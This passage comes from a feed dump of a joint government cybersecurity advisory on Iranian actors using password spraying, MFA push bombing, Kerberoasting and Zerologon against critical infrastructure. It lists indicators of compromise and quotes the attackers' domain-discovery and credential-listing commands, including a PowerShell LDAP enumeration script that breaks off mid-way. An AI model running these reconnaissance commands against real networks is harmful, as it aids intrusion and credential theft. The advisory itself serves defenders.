<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1087/002/\" title=\"Account Discovery: Domain Account\">T1087.002</a></td>
<td>The actors used LOTL to return lists of domain administrators and enterprise administrators.</td>
</tr>
<tr>
<td>Domain Trust Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1482\" title=\"Domain Trust Discovery\">T1482</a></td>
<td>The actors used LOTL to return information about trusted domains.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10: Lateral Movement</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title&nbsp;</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Services: Remote Desktop Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/001/\" title=\"Remote Services: Remote Desktop Protocol\">T1021.001</a></td>
<td>The actors used Microsoft Word to open PowerShell to launch RDP binary mstsc.exe.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 11: Collection</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data from Local System</td>
<td><a href=\"https://attack.mitre.org/techniques/T1005/\" title=\"Data from Local System\">T1005</a></td>
<td>The actors downloaded files related to remote access methods and the organization’s inventory.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 12: Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Application Layer Protocol: Web Protocols</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/001/\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a></td>
<td>The actors used <code>msedge.exe</code> to make outbound connections likely to Cobalt Strike Beacon C2 infrastructure.</td>
</tr>
<tr>
<td>Ingress Tool Transfer</td>
<td><a href=\"https://attack.mitre.org/techniques/T1105/\" title=\"Ingress Tool Transfer\">T1105</a></td>
<td>The actors imported a tool from GitHub and used it to conduct password spraying.</td>
</tr>
<tr>
<td>Protocol Tunneling</td>
<td><a href=\"https://attack.mitre.org/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a></td>
<td>The actors frequently conduct targeting using a virtual private network (VPN).</td>
</tr>
</tbody>
</table>
<h2><strong>Appendix B: Indicators of Compromise</strong></h2>
<p>See <strong>Tables 13 to 15</strong> for IOCs obtained from FBI investigations.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table&nbsp;13: Malicious Files Associated with Iranian Cyber Actors</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Hash</th>
<th role=\"columnheader\">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>1F96D15B26416B2C7043EE7172357AF3AFBB002A</td>
<td>Associated with malicious activity.</td>
</tr>
<tr>
<td>3D3CDF7CFC881678FEBCAFB26AE423FE5AA4EFEC</td>
<td>Associated with malicious activity.</td>
</tr>
</tbody>
</table>
<p><strong>Disclaimer:</strong> The authoring organizations recommend network defenders investigate or vet IP addresses prior to taking action, such as blocking, as many cyber actors are known to change IP addresses, sometimes daily, and some IP addresses may host valid domains. Many of the IP addresses provided below are assessed VPN nodes and as such are not exclusive to the Iranian actors’ use. The authoring organizations do not recommend blocking these IP addresses based solely on their inclusion in this JCSA. The authoring organizations recommend using the below IP addresses to search for previous activity the actors may have conducted against networks. If positive hits for these IP addresses are identified, the authoring organizations recommend making an independent determination if the observed activity aligns with the TTPs outlined in the JCSA. The timeframes included in the table reflect the timeframe the actors likely used the IPs.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table&nbsp;14: Network Indicators</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">IP Address</th>
<th role=\"columnheader\">Date Range</th>
</tr>
</thead>
<tbody>
<tr>
<td>95.181.234.12</td>
<td>01/30/2024 to 02/07/2024</td>
</tr>
<tr>
<td>95.181.234.25</td>
<td>01/30/2024 to 02/07/2024</td>
</tr>
<tr>
<td>173.239.232.20</td>
<td>10/06/2023 to 12/19/2023</td>
</tr>
<tr>
<td>172.98.71.191</td>
<td>10/15/2023 to 11/27/2023</td>
</tr>
<tr>
<td>102.129.235.127</td>
<td>10/21/2023 to 10/22/2023</td>
</tr>
<tr>
<td>188.126.94.60</td>
<td>10/22/2023 to 01/12/2024</td>
</tr>
<tr>
<td>149.40.50.45</td>
<td>10/26/2023</td>
</tr>
<tr>
<td>181.214.166.59</td>
<td>10/26/2023</td>
</tr>
<tr>
<td>212.102.39.212</td>
<td>10/26/2023</td>
</tr>
<tr>
<td>149.57.16.134</td>
<td>10/26/2023 to 10/27/2023</td>
</tr>
<tr>
<td>149.57.16.137</td>
<td>10/26/2023 to 10/27/2023</td>
</tr>
<tr>
<td>102.129.235.186</td>
<td>10/29/2023 to 11/08/2023</td>
</tr>
<tr>
<td>46.246.8.138</td>
<td>10/31/2023 to 01/26/2024</td>
</tr>
<tr>
<td>149.57.16.160</td>
<td>11/08/2023</td>
</tr>
<tr>
<td>149.57.16.37</td>
<td>11/08/2023</td>
</tr>
<tr>
<td>46.246.8.137</td>
<td>11/17/2023 to 01/25/2024</td>
</tr>
<tr>
<td>212.102.57.29</td>
<td>11/19/2023 to 01/17/2024</td>
</tr>
<tr>
<td>46.246.8.82</td>
<td>11/22/2023 to 01/28/2024</td>
</tr>
<tr>
<td>95.181.234.15</td>
<td>11/26/2023 to 02/07/2024</td>
</tr>
<tr>
<td>45.88.97.225</td>
<td>11/27/2023 to 02/11/2024</td>
</tr>
<tr>
<td>84.239.45.17</td>
<td>12/04/2023 to 12/07/2023</td>
</tr>
<tr>
<td>46.246.8.104</td>
<td>12/07/2023 to 02/07/2024</td>
</tr>
<tr>
<td>37.46.113.206</td>
<td>12/07/2023</td>
</tr>
<tr>
<td>46.246.3.186</td>
<td>12/07/2023 to 12/09/2023</td>
</tr>
<tr>
<td>46.246.8.141</td>
<td>12/07/2023 to 02/10/2024</td>
</tr>
<tr>
<td>46.246.8.17</td>
<td>12/09/2023 to 01/09/2024</td>
</tr>
<tr>
<td>37.19.197.182</td>
<td>12/15/2023</td>
</tr>
<tr>
<td>154.16.192.38</td>
<td>12/25/2023 to 01/24/2024</td>
</tr>
<tr>
<td>102.165.16.127</td>
<td>12/27/2023 to 01/28/2024</td>
</tr>
<tr>
<td>46.246.8.47</td>
<td>12/29/2023 to 01/29/2024</td>
</tr>
<tr>
<td>46.246.3.225</td>
<td>12/30/2023 to 02/06/2024</td>
</tr>
<tr>
<td>46.246.3.226</td>
<td>12/31/2023 to 02/03/2024</td>
</tr>
<tr>
<td>46.246.3.240</td>
<td>12/31/2023 to 02/06/2024</td>
</tr>
<tr>
<td>191.101.217.10</td>
<td>01/05/2024</td>
</tr>
<tr>
<td>102.129.153.182</td>
<td>01/08/2024</td>
</tr>
<tr>
<td>46.246.3.196</td>
<td>01/08/2024</td>
</tr>
<tr>
<td>102.129.152.60</td>
<td>01/09/2024</td>
</tr>
<tr>
<td>156.146.60.74</td>
<td>01/10/2024</td>
</tr>
<tr>
<td>191.96.227.113</td>
<td>01/10/2024</td>
</tr>
<tr>
<td>191.96.227.122</td>
<td>01/10/2024</td>
</tr>
<tr>
<td>181.214.166.132</td>
<td>01/11/2024</td>
</tr>
<tr>
<td>188.126.94.57</td>
<td>01/11/2024 to 01/13/2024</td>
</tr>
<tr>
<td>154.6.13.144</td>
<td>01/13/2024 to 01/24/2024</td>
</tr>
<tr>
<td>154.6.13.151</td>
<td>01/13/2024 to 01/28/2024</td>
</tr>
<tr>
<td>188.126.94.166</td>
<td>01/15/2024</td>
</tr>
<tr>
<td>89.149.38.204</td>
<td>01/18/2024</td>
</tr>
<tr>
<td>46.246.8.67</td>
<td>01/20/2024</td>
</tr>
<tr>
<td>46.246.8.53</td>
<td>01/22/2024</td>
</tr>
<tr>
<td>154.16.192.37</td>
<td>01/24/2024</td>
</tr>
<tr>
<td>191.96.150.14</td>
<td>01/24/2024</td>
</tr>
<tr>
<td>191.96.150.96</td>
<td>01/24/2024</td>
</tr>
<tr>
<td>46.246.8.10</td>
<td>01/24/2024</td>
</tr>
<tr>
<td>84.239.25.13</td>
<td>01/24/2024</td>
</tr>
<tr>
<td>154.6.13.139</td>
<td>01/26/2024</td>
</tr>
<tr>
<td>191.96.106.33</td>
<td>01/26/2024</td>
</tr>
<tr>
<td>191.96.227.159</td>
<td>01/26/2024</td>
</tr>
<tr>
<td>149.57.16.150</td>
<td>01/27/2024</td>
</tr>
<tr>
<td>191.96.150.21</td>
<td>01/27/2024</td>
</tr>
<tr>
<td>46.246.8.84</td>
<td>01/27/2024</td>
</tr>
<tr>
<td>95.181.235.8</td>
<td>01/27/2024</td>
</tr>
<tr>
<td>191.96.227.102</td>
<td>01/27/2024 to 01/28/2024</td>
</tr>
<tr>
<td>46.246.122.185</td>
<td>01/28/2024</td>
</tr>
<tr>
<td>146.70.102.3</td>
<td>01/29/2024 to 01/30/2024</td>
</tr>
<tr>
<td>46.246.3.233</td>
<td>01/30/2024 to 02/15/2024</td>
</tr>
<tr>
<td>46.246.3.239</td>
<td>01/30/2024 to 02/15/2024</td>
</tr>
<tr>
<td>188.126.89.35</td>
<td>02/03/2024</td>
</tr>
<tr>
<td>46.246.3.223</td>
<td>02/03/2024</td>
</tr>
<tr>
<td>46.246.3.245</td>
<td>02/05/2024 to 02/06/2024</td>
</tr>
<tr>
<td>191.96.150.50</td>
<td>02/09/2024</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table&nbsp;15: Devices</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Device Type</th>
<th role=\"columnheader\">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Samsung Galaxy A71 (SM-A715F)</td>
<td>Registered with MFA</td>
</tr>
<tr>
<td>Samsung SM-G998B</td>
<td>Registered with MFA</td>
</tr>
<tr>
<td>Samsung SM-M205F</td>
<td>Registered with MFA</td>
</tr>
</tbody>
</table>
</div>
<p>&nbsp;</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>" "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-290a" (26362 39307) new 1 nil nil ((title nil "Iranian Cyber Actors’ Brute Force and Credential Access Activity Compromises Critical Infrastructure Organizations") (link nil "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-290a") (description nil "<h2><strong>Summary</strong></h2>
<p>The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the National Security Agency (NSA), the Communications Security Establishment Canada (CSE), the Australian Federal Police (AFP), and Australian Signals Directorate's Australian Cyber Security Centre (ASD's ACSC) are releasing this joint Cybersecurity Advisory to warn network defenders of Iranian cyber actors’ use of brute force and other techniques to compromise organizations across multiple critical infrastructure sectors, including the healthcare and public health (HPH), government, information technology, engineering, and energy sectors. The actors likely aim to obtain credentials and information describing the victim’s network that can then be sold to enable access to cybercriminals.</p>
<p>Since October 2023, Iranian actors have used brute force, such as password spraying, and multifactor authentication (MFA) ‘push bombing’ to compromise user accounts and obtain access to organizations. The actors frequently modified MFA registrations, enabling persistent access. The actors performed discovery on the compromised networks to obtain additional credentials and identify other information that could be used to gain additional points of access. The authoring agencies assess the Iranian actors sell this information on cybercriminal forums to actors who may use the information to conduct additional malicious activity.</p>
<p>This advisory provides the actors’ tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs). The information is derived from FBI engagements with entities impacted by this malicious activity.</p>
<p>The authoring agencies recommend critical infrastructure organizations follow the guidance provided in the <strong>Mitigations</strong> section. At a minimum, organizations should ensure all accounts use strong passwords and register a second form of authentication.</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-10/aa24-290a-iranian-cyber-actors-conduct-brute-force-and-credential-access-activity.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-290A Iranian Cyber Actors’ Brute Force and Credential Access Activity Compromises Critical Infrastructure Organizations</a>
    <span class=\"c-file__size\">(PDF,       794.32 KB
  )</span>
  </div>
</div>
<p>For a downloadable list of IOCs, see:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-10/AA24-290A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA24-290A STIX XML</a>
    <span class=\"c-file__size\">(XML,       96.61 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-10/AA24-290A.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA24-290A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       81.92 KB
  )</span>
  </div>
</div>
<h2><strong>Technical Details</strong></h2>
<p><strong>Note:&nbsp;</strong>This advisory uses the&nbsp;<a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\">MITRE ATT&amp;CK<sup>®</sup></a><a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\"> for Enterprise</a> framework, version 15. See the <strong>MITRE ATT&amp;CK Tactics and Techniques</strong> section in <strong>Appendix A</strong> for a table of the actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques.</p>
<h3><strong>Overview of Activity</strong></h3>
<p>The actors likely conduct reconnaissance operations to gather victim identity [<a href=\"https://attack.mitre.org/techniques/T1589/\" title=\"Gather Victim Identity Information\">T1589</a>] information. Once obtained, the actors gain persistent access to victim networks frequently via brute force [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/\" title=\"Brute Force\">T1110</a>]. After gaining access, the actors use a variety of techniques to further gather credentials, escalate privileges, and gain information about the entity’s systems and network. The actors also move laterally and download information that could assist other actors with access and exploitation.</p>
<h3><strong>Initial Access and Persistence</strong></h3>
<p>The actors use valid user and group email accounts [<a href=\"https://attack.mitre.org/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>], frequently obtained via brute force such as password spraying [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/003/\" title=\"Brute Force: Password Spraying\">T1110.003</a>] although other times via unknown methods, to obtain initial access to Microsoft 365, Azure [<a href=\"https://attack.mitre.org/techniques/T1078/004/\" title=\"Valid Accounts: Cloud Accounts\">T1078.004</a>], and Citrix systems [<a href=\"https://attack.mitre.org/techniques/T1133/\" title=\"External Remote Services\">T1133</a>]. In some cases where push notification-based MFA was enabled, the actors send MFA requests to legitimate users seeking acceptance of the request. This technique—bombarding users with mobile phone push notifications until the user either approves the request by accident or stops the notifications— is known as “MFA fatigue” or “push bombing” [<a href=\"https://attack.mitre.org/techniques/T1621/\" title=\"Multi-Factor Authentication Request Generation\">T1621</a>].</p>
<p>Once the threat actors gain access to an account, they frequently register their devices with MFA to protect their access to the environment via the valid account:</p>
<ul>
<li>In two confirmed compromises, the actors leveraged a compromised user’s open registration for MFA [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1556/006/\" title=\"Modify Authentication Process: Multi-Factor Authentication\">T1556.006</a>] to register the actor’s own device [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1098/005/\" title=\"Account Manipulation: Device Registration\">T1098.005</a>] to access the environment.</li>
<li>In another confirmed compromise, the actors used a self-service password reset (SSPR) tool associated with a public facing Active Directory Federation Service (ADFS) to reset the accounts with expired passwords [<a href=\"https://attack.mitre.org/techniques/T1484/002/\" title=\"Domain or Tenant Policy Modification: Trust Modification\">T1484.002</a>] and then registered MFA through Okta for compromised accounts without MFA already enabled [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1556\" title=\"Modify Authentication Process\">T1556</a>] [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1556/006/\" title=\"Modify Authentication Process: Multi-Factor Authentication\">T1556.006</a>].</li>
</ul>
<p>The actors frequently conduct their activity using a virtual private network (VPN) service [<a href=\"https://attack.mitre.org/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>]. Several of the IP addresses in the actors’ malicious activity originate from exit nodes tied to the Private Internet Access VPN service.</p>
<h3><strong>Lateral Movement</strong></h3>
<p>The actors use Remote Desktop Protocol (RDP) for lateral movement&nbsp;[<a href=\"https://attack.mitre.org/techniques/T1021/001/\" title=\"Remote Services: Remote Desktop Protocol\">T1021.001</a>]. In one instance, the actors used Microsoft Word to open PowerShell to launch the RDP binary&nbsp;<code>mstsc.exe</code> [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1202\" title=\"Indirect Command Execution\">T1202</a><u>]</u>.</p>
<h3><strong>Credential Access</strong></h3>
<p>The actors likely use open-source tools and methodologies to gather more credentials.&nbsp;The actors performed Kerberos Service Principal Name (SPN) enumeration of several service accounts and received Kerberos tickets [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1558/003/\" title=\"Steal or Forge Kerberos Tickets: Kerberoasting\">T1558.003</a>]. In one instance, the actors used the Active Directory (AD) Microsoft Graph Application Program Interface (API) PowerShell application likely to perform a directory dump of all AD accounts. Also, the actors imported the tool [<a href=\"https://attack.mitre.org/techniques/T1105/\" title=\"Ingress Tool Transfer\">T1105</a>] <code>DomainPasswordSpray.ps1</code>, which is openly available on GitHub&nbsp;[<a href=\"https://attack.mitre.org/techniques/T1588/002/\" title=\"Obtain Capabilities: Tool\">T1588.002</a>], likely to conduct password spraying. The actors also used the command <code>Cmdkey /list</code>, likely to display usernames and credentials [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1555/\">T1555</a>].</p>
<h3><strong>Privilege Escalation</strong></h3>
<p>In one instance, the actors attempted impersonation of the domain controller, likely by exploiting Microsoft’s Netlogon (also known as ”Zerologon”) privilege escalation vulnerability (CVE-2020-1472) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1068/\" title=\"Exploitation for Privilege Escalation\">T1068</a>].</p>
<h3><strong>Discovery</strong></h3>
<p>The actors leverage&nbsp;living off the land (LOTL) to gain knowledge about the target systems and internal networks. The actors used the following Windows command-line tools to gather information about domain controllers [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1018\" title=\"Remote System Discovery\">T1018</a>], trusted domains [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1482\" title=\"Domain Trust Discovery\">T1482</a>], lists of domain administrators, and enterprise administrators [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1087/002/\" title=\"Account Discovery: Domain Account\">T1087.002</a>] [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1069/002/\" title=\"Permission Groups Discovery: Domain Groups\">T1069.002</a>] [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1069/003/\" title=\"Permission Groups Discovery: Cloud Groups\">T1069.003</a>]:</p>
<ul>
<li><code>Nltest /dclist</code></li>
<li><code>Nltest /domain_trusts</code></li>
<li><a><code>Nltest /domain_trusts</code></a><code>/all_trusts</code></li>
<li><code>Net group “Enterprise admins” /domain</code></li>
<li><code>Net group “Domain admins” /domain</code></li>
</ul>
<p>Next, the actors used the following Lightweight Directory Access Protocol (LDAP) query in PowerShell [<a href=\"https://attack.mitre.org/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a>]to search the AD for computer display names, operating systems, descriptions, and distinguished names [<a href=\"https://attack.mitre.org/techniques/T1082/\" title=\"System Information Discovery\">T1082</a>].</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$i=0</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$D= [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$L='LDAP://' . $D</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$D = [ADSI]$L</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$Date = $((Get-Date).AddDays(-90).ToFileTime())</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$str = '(&amp;(objectcategory=computer)(operatingSystem=*serv*)(|(lastlogon&gt;='+$Date+')(lastlogontimestamp&gt;='+$Date+')))'</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$s = [adsisearcher]$str</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$s.searchRoot = $L.$D.distinguishedName</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$s.PropertiesToLoad.Add('cn') &gt; $Null</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$s.PropertiesToLoad.Add('operatingsystem') &gt; $Null</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$s.PropertiesToLoad.Add('description') &gt; $Null</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$s.PropertiesToLoad.Add('distinguishedName') &gt; $Null</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>Foreach ($CA in $s.FindAll()) {</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>Write-Host $CA.Properties.Item('cn')</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$CA.Properties.Item('operatingsystem')</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$CA. Properties.Item('description')</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 